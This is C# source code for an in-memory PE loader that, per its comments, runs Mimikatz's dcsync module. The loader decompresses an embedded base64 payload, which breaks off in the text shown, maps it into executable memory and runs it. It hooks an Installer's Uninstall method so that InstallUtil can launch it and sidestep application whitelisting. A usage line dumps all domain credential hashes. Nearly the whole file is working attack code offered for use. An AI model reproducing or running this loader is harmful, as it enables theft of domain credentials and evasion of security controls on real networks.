//This is the dcsync mode extracted from Mimikatz.
//The source code in KatzCompressed is https://github.com/3gstudent/test/blob/master/Mimkatz-dcsync.zip
//You can use https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/GzipandBase64.cs to generate the KatzCompressed string.
//Usage:
//C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe DcsyncofMimikatz.cs
//DcsyncofMimikatz.exe log "lsadump::dcsync /domain:test.com /all /csv" exit


using System;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Runtime.InteropServices;
 
 
 
/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
*/
 
namespace PELoader
{
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public static byte[] Compress(byte[] raw)
        {
            using (MemoryStream memory = new MemoryStream())
            {
                using (GZipStream gzip = new GZipStream(memory,
                CompressionMode.Compress, true))
                {
                gzip.Write(raw, 0, raw.Length);
                }
                return memory.ToArray();
            }
        }
         
     
     
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            /*
            byte[] AsBytes = File.ReadAllBytes(@"C:\Tools\Mimikatz.exe");
            byte[] compress = Compress(AsBytes);
            String AsBase64String = Convert.ToBase64String(compress);
            StreamWriter sw = new StreamWriter(@"C:\Tools\Mimikatz.b64");
            sw.Write(AsBase64String);
            sw.Close();
            */
            Program.Main();
             
        }
 
    }
    class Program
    {
        static byte[] Decompress(byte[] gzip)
        {
            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream memory = new MemoryStream())
                {
                int count = 0;
                do
                {
                    count = stream.Read(buffer, 0, size);
                    if (count > 0)
                    {
                    memory.Write(buffer, 0, count);
                    }
                }
                while (count > 0);
                return memory.ToArray();
                }
            }
        }
         
        public static void Main()
        {
            //PELoader pe = new PELoader(@"c:\Tools\mimikatz.exe");
            //PELoader pe = new PELoader(@"c:\Tools\powerkatz.dll");
            byte[] FromBase64 = System.Convert.FromBase64String(Katz.KatzCompressed);
            byte[] decompressed = Decompress(FromBase64);

            PELoader pe = new PELoader(decompressed);
 
            Console.WriteLine("Preferred Load Address = {0}", pe.OptionalHeader64.ImageBase.ToString("X4"));
 
            IntPtr codebase = IntPtr.Zero;
 
            codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader64.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
 
            Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader64.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
 
 
            //Copy Sections
            for (int i = 0; i < pe.FileHeader.NumberOfSections; i++)
            {
 
                IntPtr y = NativeDeclarations.VirtualAlloc(IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[i].VirtualAddress), pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                Marshal.Copy(pe.RawBytes, (int)pe.ImageSectionHeaders[i].PointerToRawData, y, (int)pe.ImageSectionHeaders[i].SizeOfRawData);
                Console.WriteLine("Section {0}, Copied To {1}", new string(pe.ImageSectionHeaders[i].Name), y.ToString("X4"));
            }
 
            //Perform Base Relocation
            //Calculate Delta
            long currentbase = (long)codebase.ToInt64();
            long delta;
 
            delta = (long)(currentbase - (long)pe.OptionalHeader64.ImageBase);
 
 
            Console.WriteLine("Delta = {0}", delta.ToString("X4"));
 
            //Modify Memory Based On Relocation Table
 
            //Console.WriteLine(pe.OptionalHeader64.BaseRelocationTable.VirtualAddress.ToString("X4"));
            //Console.WriteLine(pe.OptionalHeader64.BaseRelocationTable.Size.ToString("X4"));
 
            IntPtr relocationTable = (IntPtr.Add(codebase, (int)pe.OptionalHeader64.BaseRelocationTable.VirtualAddress));
            //Console.WriteLine(relocationTable.ToString("X4"));
 
            NativeDeclarations.IMAGE_BASE_RELOCATION relocationEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
            relocationEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTable, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
            //Console.WriteLine(relocationEntry.VirtualAdress.ToString("X4"));
            //Console.WriteLine(relocationEntry.SizeOfBlock.ToString("X4"));
 
            int imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
            IntPtr nextEntry = relocationTable;
            int sizeofNextBlock = (int)relocationEntry.SizeOfBlock;
            IntPtr offset = relocationTable;
 
            while (true)
            {
 
                NativeDeclarations.IMAGE_BASE_RELOCATION relocationNextEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
                IntPtr x = IntPtr.Add(relocationTable, sizeofNextBlock);
                relocationNextEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(x, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
 
 
                IntPtr dest = IntPtr.Add(codebase, (int)relocationEntry.VirtualAdress);
 
 
                //Console.WriteLine("Section Has {0} Entires",(int)(relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) /2);
                //Console.WriteLine("Next Section Has {0} Entires", (int)(relocationNextEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2);
 
                for (int i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
                {
 
                    IntPtr patchAddr;
                    UInt16 value = (UInt16)Marshal.ReadInt16(offset, 8 + (2 * i));
 
                    UInt16 type = (UInt16)(value >> 12);
                    UInt16 fixup = (UInt16)(value & 0xfff);
                    //Console.WriteLine("{0}, {1}, {2}", value.ToString("X4"), type.ToString("X4"), fixup.ToString("X4"));
 
                    switch (type)
                    {
                        case 0x0:
                            break;
                        case 0xA:
                            patchAddr = IntPtr.Add(dest, fixup);
                            //Add Delta To Location.
                            long originalAddr = Marshal.ReadInt64(patchAddr);
                            Marshal.WriteInt64(patchAddr, originalAddr + delta);
                            break;
 
                    }
 
                }
 
                offset = IntPtr.Add(relocationTable, sizeofNextBlock);
                sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
                relocationEntry = relocationNextEntry;
 
                nextEntry = IntPtr.Add(nextEntry, sizeofNextBlock);
 
                if (relocationNextEntry.SizeOfBlock == 0) break;
 
 
            }
 
 
            //Resolve Imports
 
            IntPtr z = IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress);
            IntPtr oa1 = IntPtr.Add(codebase, (int)pe.OptionalHeader64.ImportTable.VirtualAddress);
            int oa2 = Marshal.ReadInt32(IntPtr.Add(oa1, 16));
 
            //Get And Display Each DLL To Load
            for (int j = 0; j < 999; j++) //HardCoded Number of DLL's Do this Dynamically.
            {
                IntPtr a1 = IntPtr.Add(codebase, (20 * j) + (int)pe.OptionalHeader64.ImportTable.VirtualAddress);
                int entryLength = Marshal.ReadInt32(IntPtr.Add(a1, 16));
                IntPtr a2 = IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress + (entryLength - oa2)); //Need just last part? 
                IntPtr dllNamePTR = (IntPtr)(IntPtr.Add(codebase, +Marshal.ReadInt32(IntPtr.Add(a1, 12))));
                string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
                if (DllName == "") { break; }
 
                IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
                Console.WriteLine("Loaded {0}", DllName);
                for (int k = 1; k < 9999; k++)
                {
                    IntPtr dllFuncNamePTR = (IntPtr.Add(codebase, +Marshal.ReadInt32(a2)));
                    string DllFuncName = Marshal.PtrToStringAnsi(IntPtr.Add(dllFuncNamePTR, 2));
                    //Console.WriteLine("Function {0}", DllFuncName);
                    IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);
                    Marshal.WriteInt64(a2, (long)funcAddy);
                    a2 = IntPtr.Add(a2, 8);
                    if (DllFuncName == "") break;
 
                }
 
 
                //Console.ReadLine();
            }
 
            //Transfer Control To OEP
            Console.WriteLine("Executing Mimikatz");
            IntPtr threadStart = IntPtr.Add(codebase, (int)pe.OptionalHeader64.AddressOfEntryPoint);
            IntPtr hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
            NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);
 
            Console.WriteLine("Thread Complete");
            //Console.ReadLine();
 
 
 
        } //End Main
 
 
 
    }//End Program
 
    public class PELoader
    {
        public struct IMAGE_DOS_HEADER
        {      // DOS .EXE header
            public UInt16 e_magic;              // Magic number
            public UInt16 e_cblp;               // Bytes on last page of file
            public UInt16 e_cp;                 // Pages in file
            public UInt16 e_crlc;               // Relocations
            public UInt16 e_cparhdr;            // Size of header in paragraphs
            public UInt16 e_minalloc;           // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
            public UInt16 e_ss;                 // Initial (relative) SS value
            public UInt16 e_sp;                 // Initial SP value
            public UInt16 e_csum;               // Checksum
            public UInt16 e_ip;                 // Initial IP value
            public UInt16 e_cs;                 // Initial (relative) CS value
            public UInt16 e_lfarlc;             // File address of relocation table
            public UInt16 e_ovno;               // Overlay number
            public UInt16 e_res_0;              // Reserved words
            public UInt16 e_res_1;              // Reserved words
            public UInt16 e_res_2;              // Reserved words
            public UInt16 e_res_3;              // Reserved words
            public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;            // OEM information; e_oemid specific
            public UInt16 e_res2_0;             // Reserved words
            public UInt16 e_res2_1;             // Reserved words
            public UInt16 e_res2_2;             // Reserved words
            public UInt16 e_res2_3;             // Reserved words
            public UInt16 e_res2_4;             // Reserved words
            public UInt16 e_res2_5;             // Reserved words
            public UInt16 e_res2_6;             // Reserved words
            public UInt16 e_res2_7;             // Reserved words
            public UInt16 e_res2_8;             // Reserved words
            public UInt16 e_res2_9;             // Reserved words
            public UInt32 e_lfanew;             // File address of new exe header
        }
 
        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }
 
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt32 BaseOfData;
            public UInt32 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt32 SizeOfStackReserve;
            public UInt32 SizeOfStackCommit;
            public UInt32 SizeOfHeapReserve;
            public UInt32 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;
 
            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }
 
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt64 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt64 SizeOfStackReserve;
            public UInt64 SizeOfStackCommit;
            public UInt64 SizeOfHeapReserve;
            public UInt64 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;
 
            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }
 
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }
 
        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;
            [FieldOffset(8)]
            public UInt32 VirtualSize;
            [FieldOffset(12)]
            public UInt32 VirtualAddress;
            [FieldOffset(16)]
            public UInt32 SizeOfRawData;
            [FieldOffset(20)]
            public UInt32 PointerToRawData;
            [FieldOffset(24)]
            public UInt32 PointerToRelocations;
            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;
            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;
            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)]
            public DataSectionFlags Characteristics;
 
            public string Section
            {
                get { return new string(Name); }
            }
        }
 
        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }
 
        [Flags]
        public enum DataSectionFlags : uint
        {
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeReg = 0x00000000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeDsect = 0x00000001,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeNoLoad = 0x00000002,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeGroup = 0x00000004,
            /// <summary>
            /// The section should not be padded to the next boundary. This flag is obsolete and is replaced by IMAGE_SCN_ALIGN_1BYTES. This is valid only for object files.
            /// </summary>
            TypeNoPadded = 0x00000008,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeCopy = 0x00000010,
            /// <summary>
            /// The section contains executable code.
            /// </summary>
            ContentCode = 0x00000020,
            /// <summary>
            /// The section contains initialized data.
            /// </summary>
            ContentInitializedData = 0x00000040,
            /// <summary>
            /// The section contains uninitialized data.
            /// </summary>
            ContentUninitializedData = 0x00000080,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            LinkOther = 0x00000100,
            /// <summary>
            /// The section contains comments or other information. The .drectve section has this type. This is valid for object files only.
            /// </summary>
            LinkInfo = 0x00000200,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeOver = 0x00000400,
            /// <summary>
            /// The section will not become part of the image. This is valid only for object files.
            /// </summary>
            LinkRemove = 0x00000800,
            /// <summary>
            /// The section contains COMDAT data. For more information, see section 5.5.6, COMDAT Sections (Object Only). This is valid only for object files.
            /// </summary>
            LinkComDat = 0x00001000,
            /// <summary>
            /// Reset speculative exceptions handling bits in the TLB entries for this section.
            /// </summary>
            NoDeferSpecExceptions = 0x00004000,
            /// <summary>
            /// The section contains data referenced through the global pointer (GP).
            /// </summary>
            RelativeGP = 0x00008000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            MemPurgeable = 0x00020000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            Memory16Bit = 0x00020000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            MemoryLocked = 0x00040000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            MemoryPreload = 0x00080000,
            /// <summary>
            /// Align data on a 1-byte boundary. Valid only for object files.
            /// </summary>
            Align1Bytes = 0x00100000,
            /// <summary>
            /// Align data on a 2-byte boundary. Valid only for object files.
            /// </summary>
            Align2Bytes = 0x00200000,
            /// <summary>
            /// Align data on a 4-byte boundary. Valid only for object files.
            /// </summary>
            Align4Bytes = 0x00300000,
            /// <summary>
            /// Align data on an 8-byte boundary. Valid only for object files.
            /// </summary>
            Align8Bytes = 0x00400000,
            /// <summary>
            /// Align data on a 16-byte boundary. Valid only for object files.
            /// </summary>
            Align16Bytes = 0x00500000,
            /// <summary>
            /// Align data on a 32-byte boundary. Valid only for object files.
            /// </summary>
            Align32Bytes = 0x00600000,
            /// <summary>
            /// Align data on a 64-byte boundary. Valid only for object files.
            /// </summary>
            Align64Bytes = 0x00700000,
            /// <summary>
            /// Align data on a 128-byte boundary. Valid only for object files.
            /// </summary>
            Align128Bytes = 0x00800000,
            /// <summary>
            /// Align data on a 256-byte boundary. Valid only for object files.
            /// </summary>
            Align256Bytes = 0x00900000,
            /// <summary>
            /// Align data on a 512-byte boundary. Valid only for object files.
            /// </summary>
            Align512Bytes = 0x00A00000,
            /// <summary>
            /// Align data on a 1024-byte boundary. Valid only for object files.
            /// </summary>
            Align1024Bytes = 0x00B00000,
            /// <summary>
            /// Align data on a 2048-byte boundary. Valid only for object files.
            /// </summary>
            Align2048Bytes = 0x00C00000,
            /// <summary>
            /// Align data on a 4096-byte boundary. Valid only for object files.
            /// </summary>
            Align4096Bytes = 0x00D00000,
            /// <summary>
            /// Align data on an 8192-byte boundary. Valid only for object files.
            /// </summary>
            Align8192Bytes = 0x00E00000,
            /// <summary>
            /// The section contains extended relocations.
            /// </summary>
            LinkExtendedRelocationOverflow = 0x01000000,
            /// <summary>
            /// The section can be discarded as needed.
            /// </summary>
            MemoryDiscardable = 0x02000000,
            /// <summary>
            /// The section cannot be cached.
            /// </summary>
            MemoryNotCached = 0x04000000,
            /// <summary>
            /// The section is not pageable.
            /// </summary>
            MemoryNotPaged = 0x08000000,
            /// <summary>
            /// The section can be shared in memory.
            /// </summary>
            MemoryShared = 0x10000000,
            /// <summary>
            /// The section can be executed as code.
            /// </summary>
            MemoryExecute = 0x20000000,
            /// <summary>
            /// The section can be read.
            /// </summary>
            MemoryRead = 0x40000000,
            /// <summary>
            /// The section can be written to.
            /// </summary>
            MemoryWrite = 0x80000000
        }
 
        /// <summary>
        /// The DOS header
        /// </summary>
        private IMAGE_DOS_HEADER dosHeader;
        /// <summary>
        /// The file header
        /// </summary>
        private IMAGE_FILE_HEADER fileHeader;
        /// <summary>
        /// Optional 32 bit file header 
        /// </summary>
        private IMAGE_OPTIONAL_HEADER32 optionalHeader32;
        /// <summary>
        /// Optional 64 bit file header 
        /// </summary>
        private IMAGE_OPTIONAL_HEADER64 optionalHeader64;
        /// <summary>
        /// Image Section headers. Number of sections is in the file header.
        /// </summary>
        private IMAGE_SECTION_HEADER[] imageSectionHeaders;
 
        private byte[] rawbytes;
 
 
 
        public PELoader(string filePath)
        {
            // Read in the DLL or EXE and get the timestamp
            using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
            {
                BinaryReader reader = new BinaryReader(stream);
                dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
 
                // Add 4 bytes to the offset
                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
 
                UInt32 ntHeadersSignature = reader.ReadUInt32();
                fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                if (this.Is32BitHeader)
                {
                    optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                }
                else
                {
                    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                }
 
                imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                {
                    imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                }
 
 
 
                rawbytes = System.IO.File.ReadAllBytes(filePath);
 
            }
        }
 
        public PELoader(byte[] fileBytes)
        {
            // Read in the DLL or EXE and get the timestamp
            using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
            {
                BinaryReader reader = new BinaryReader(stream);
                dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
 
                // Add 4 bytes to the offset
                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
 
                UInt32 ntHeadersSignature = reader.ReadUInt32();
                fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                if (this.Is32BitHeader)
                {
                    optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                }
                else
                {
                    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                }
 
                imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                {
                    imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                }
 
 
                rawbytes = fileBytes;
 
            }
        }
 
 
        public static T FromBinaryReader<T>(BinaryReader reader)
        {
            // Read in a byte array
            byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));
 
            // Pin the managed memory while, copy it out the data, then unpin it
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();
 
            return theStructure;
        }
 
 
 
        public bool Is32BitHeader
        {
            get
            {
                UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
                return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
            }
        }
 
 
        public IMAGE_FILE_HEADER FileHeader
        {
            get
            {
                return fileHeader;
            }
        }
 
        /// <summary>
        /// Gets the optional header
        /// </summary>
        public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
        {
            get
            {
                return optionalHeader32;
            }
        }
 
        /// <summary>
        /// Gets the optional header
        /// </summary>
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
        {
            get
            {
                return optionalHeader64;
            }
        }
 
        public IMAGE_SECTION_HEADER[] ImageSectionHeaders
        {
            get
            {
                return imageSectionHeaders;
            }
        }
 
        public byte[] RawBytes
        {
            get
            {
                return rawbytes;
            }
 
        }
 
    }//End Class
 
 
    unsafe class NativeDeclarations
    {
 
        public static uint MEM_COMMIT = 0x1000;
        public static uint MEM_RESERVE = 0x2000;
        public static uint PAGE_EXECUTE_READWRITE = 0x40;
        public static uint PAGE_READWRITE = 0x04;
 
        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }
 
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
 
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibrary(string lpFileName);
 
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(
 
          IntPtr lpThreadAttributes,
          uint dwStackSize,
          IntPtr lpStartAddress,
          IntPtr param,
          uint dwCreationFlags,
          IntPtr lpThreadId
          );
 
        [DllImport("kernel32")]
        public static extern UInt32 WaitForSingleObject(
 
          IntPtr hHandle,
          UInt32 dwMilliseconds
          );
 
        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct IMAGE_IMPORT_DESCRIPTOR
        {
            public uint OriginalFirstThunk;
            public uint TimeDateStamp;
            public uint ForwarderChain;
            public uint Name;
            public uint FirstThunk;
        }
 
 
    }
 
    public class Katz
    {
        public static string KatzCompressed = @"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